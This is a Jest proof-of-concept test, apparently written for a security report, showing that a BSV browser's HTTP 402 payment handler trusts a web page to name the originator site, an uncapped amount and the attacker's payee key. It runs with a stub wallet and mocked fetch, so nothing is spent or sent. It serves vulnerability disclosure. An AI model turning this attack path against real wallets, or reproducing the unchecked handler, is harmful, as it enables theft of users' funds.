// PoC (verification only): the HTTP 402 handler takes the paying site, the amount and the payee key
// from page-supplied input. Runs the REAL BsvPaymentHandler with a stub wallet that records the
// originator it is called with. No network, no broadcast, no funds. See
// ChainBrowsers/docs/issues/bsv-browser-402-originator.md.
import { PrivateKey, PublicKey } from '@bsv/sdk'
import { BsvPaymentHandler } from '../utils/webview/bsvPaymentHandler'

// downloadHandler pulls in expo-file-system / expo-sharing (native); not on this path.
jest.mock('../utils/webview/downloadHandler', () => ({ handleUrlDownload: jest.fn() }))

// The handler computes derivationSuffix = btoa(timestamp) before any wallet call.
if (typeof (globalThis as any).btoa !== 'function') {
  ;(globalThis as any).btoa = (s: string) => Buffer.from(s, 'binary').toString('base64')
}

describe('402 handler trusts page-supplied url / amount / payee (PoC)', () => {
  it('spends as the page-named site, for the page-named amount, bound to the page-named key', async () => {
    const VICTIM_URL = 'https://victim.example/anything'   // the page picks this
    const ATTACKER_PAYEE = PrivateKey.fromRandom().toPublicKey().toString() // and this (x-bsv-server)
    const HUGE = 999_999                                    // and this (x-bsv-sats), far above any cap

    const derived = PrivateKey.fromRandom().toPublicKey().toString()
    const senderId = PrivateKey.fromRandom().toPublicKey().toString()

    // A stub of the RAW wallet the handler is given (managers.walletManager, unguarded). It records
    // the originator argument of every call. It never broadcasts.
    const calls: { method: string; args: any; originator: any }[] = []
    const wallet: any = {
      getPublicKey: jest.fn(async (args: any, originator: any) => {
        calls.push({ method: 'getPublicKey', args, originator })
        return { publicKey: args.identityKey ? senderId : derived }
      }),
      createAction: jest.fn(async (args: any, originator: any) => {
        calls.push({ method: 'createAction', args, originator })
        return { tx: [1, 2, 3, 4] } // a stand-in signed tx; nothing is sent anywhere
      }),
      signAction: jest.fn()
    }

    // Capture the paid-content request instead of hitting the network.
    const fetched: { url: string; headers: Record<string, string> }[] = []
    ;(globalThis as any).fetch = jest.fn(async (url: string, init?: any) => {
      fetched.push({ url, headers: (init?.headers ?? {}) as Record<string, string> })
      return {
        ok: true, status: 200, redirected: false, url,
        headers: { get: () => null },
        text: async () => '<html>paid content</html>',
        body: { cancel: async () => {} }
      } as any
    })

    const handler = new BsvPaymentHandler(wallet)

    // Exactly what the app passes from a page-posted PAYMENT_REQUIRED message
    // (app/index.tsx:1332 -> handle402(msg.url, msg.status, msg.headers)).
    const html = await handler.handle402(VICTIM_URL, 402, {
      'x-bsv-sats': String(HUGE),
      'x-bsv-server': ATTACKER_PAYEE
    })

    expect(html).toContain('paid content') // the payment path ran to completion

    // 1. Every wallet call is attributed to the page-named site, not to whatever page actually sent this.
    expect(calls.length).toBeGreaterThanOrEqual(2)
    for (const c of calls) expect(c.originator).toBe('victim.example')

    // 2. The output the wallet is asked to pay is bound to the attacker-supplied key.
    const brc29 = calls.find((c) => c.method === 'getPublicKey' && !c.args.identityKey)!
    expect(brc29.args.counterparty).toBe(ATTACKER_PAYEE)

    // 3. The amount is the page's number, with no cap applied by the handler.
    const action = calls.find((c) => c.method === 'createAction')!
    expect(action.args.outputs[0].satoshis).toBe(HUGE)
    const expectedPkh = PublicKey.fromString(derived).toHash('hex')
    expect(action.args.outputs[0].lockingScript).toBe(`76a914${expectedPkh}88ac`)

    // 4. The secret needed to spend the output (the nonce) is sent only to the page-named URL.
    const paid = fetched.find((f) => (f.headers as any)['x-bsv-beef'])!
    expect(paid.url).toBe(VICTIM_URL)
    expect((paid.headers as any)['x-bsv-nonce']).toBeTruthy()

    // eslint-disable-next-line no-console
    console.log('[PoC] originator forced to', calls[0].originator,
      '| amount', action.args.outputs[0].satoshis,
      '| payee counterparty', brc29.args.counterparty.slice(0, 16) + '…',
      '| nonce sent to', paid.url)
  })
})
